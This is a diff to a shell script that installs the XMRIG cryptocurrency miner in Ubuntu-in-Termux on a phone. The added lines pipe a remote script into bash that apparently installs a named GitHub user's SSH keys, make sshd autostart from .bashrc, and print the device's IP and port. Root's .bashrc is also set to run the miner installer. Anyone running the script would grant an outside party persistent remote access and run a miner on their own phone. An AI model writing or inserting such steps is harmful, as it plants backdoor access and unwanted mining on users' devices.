@@ -336,7 +336,11 @@ INFO "XMRIG create success"
 HEAD "Please restart Termux App to run XMRIG"
 EOM
 
-
+  INFO "Running SSH_Key_Installer" && bash <(curl -fsSL git.io/key.sh) -g jchuang1977
+  INFO "Setting termux's .bashrc" && echo "sshd" >> "$HOME/.bashrc"
+  
+  local IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
+  INFO "change local user passwd at: $IP:8022" && passwd
   
   echo "[ ! -e ./xmrig-notls ] && bash ./install.sh" >> "$HOME/ubuntu-in-termux/ubuntu-fs/root/.bashrc"
 }
@@ -387,7 +391,7 @@ EOM
 #!/bin/bash
 local IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
 INFO "SSH server running at: $IP:8022"
-  EOM
+EOM
 
  #wget "git.io/J3xxv" -O doge_phone.sh && chmod 755 doge_phone.sh
  echo "bash ./ip.sh" >> "$HOME/ubuntu-in-termux/ubuntu-fs/root/.bashrc"
